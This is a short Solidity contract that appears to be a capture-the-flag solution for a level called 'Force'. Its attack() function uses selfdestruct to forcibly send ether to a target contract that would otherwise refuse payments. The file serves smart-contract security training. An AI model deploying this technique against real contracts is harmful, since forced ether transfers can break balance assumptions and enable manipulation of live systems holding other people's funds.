// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ================================================================
// │                        LEVEL 7 - FORCE                       │
// ================================================================
contract Selfdestruct {
    function attack(address _targetContractAddress) public payable {
        selfdestruct(payable(_targetContractAddress));
    }
}
